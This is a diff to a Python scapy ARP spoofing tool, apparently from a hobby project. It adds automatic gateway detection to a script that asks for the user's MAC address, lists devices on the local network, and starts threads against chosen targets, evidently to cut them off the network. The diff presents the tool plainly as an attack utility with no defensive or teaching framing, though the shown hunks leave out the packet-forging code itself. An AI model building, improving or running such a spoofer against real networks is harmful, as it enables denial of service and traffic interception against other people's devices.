@@ -1,7 +1,7 @@
 from scapy.all import *
 import time 
 import os 
-from utils import get_info, get_ip, get_mac 
+from utils import get_info, get_ip, get_mac , get_gateway
 import threading
 
 """
@@ -10,7 +10,8 @@ need to increase efficiency of program.
 need to do code cleanup.
 need to add an exiting condition for the program to close successfully.
 need to add linux support
-Build - 1.0.1
+[++] added a support to get ip addresses outside the 192.168 ipv4 naming scheme.
+Build - 1.1.1
 """
 
 def main():
@@ -18,18 +19,18 @@ def main():
         #start of the program
         print("[+] ARP Spoofer starting soon ... , press ctrl+c to stop.")
         time.sleep(3)
+        g_ip = str(get_gateway())
         os.system("cls")
         #get mac and gateway from user
         mm = str(input("[?] Enter your mac address (use ipconfig /all in terminal if you dont know about it!) - "))
         mm = mm.replace("-",":")
-        gip  = str(input("[?] Enter gateway ip (default  - 192.168.0.1) - "))
+        gip  = str(input(f"[?] Enter gateway ip (Scanned  - {g_ip}) - "))
         os.system("cls")
 
         #gets information about devices in network
         h = get_info()
         print("From the table....")
         print("\n")
-        #n_instance = int(input("Enter number of runner-instance for the program (Number of devices you want to kcik off) :- "))
         
         #take target ids from user
         ids = str(input("[?] Enter the id(s) of your target(s) with a '&' in b/w two ids - "))
@@ -63,7 +64,7 @@ def main():
                         flag = 1
                  
 
-        def run(x):#Runner function which takes in ratget id
+        def run(x):#Runner function which takes in target id
             try:
                 global id , tm , tip
                 id = int(x)
@@ -76,7 +77,7 @@ def main():
                 print(e)
 
 
-        threads = []#list of threads for the different instances of runner function.
+        threads = []#list of threads for the  runner function.
         
 
         #creating threads for each instance of runner function
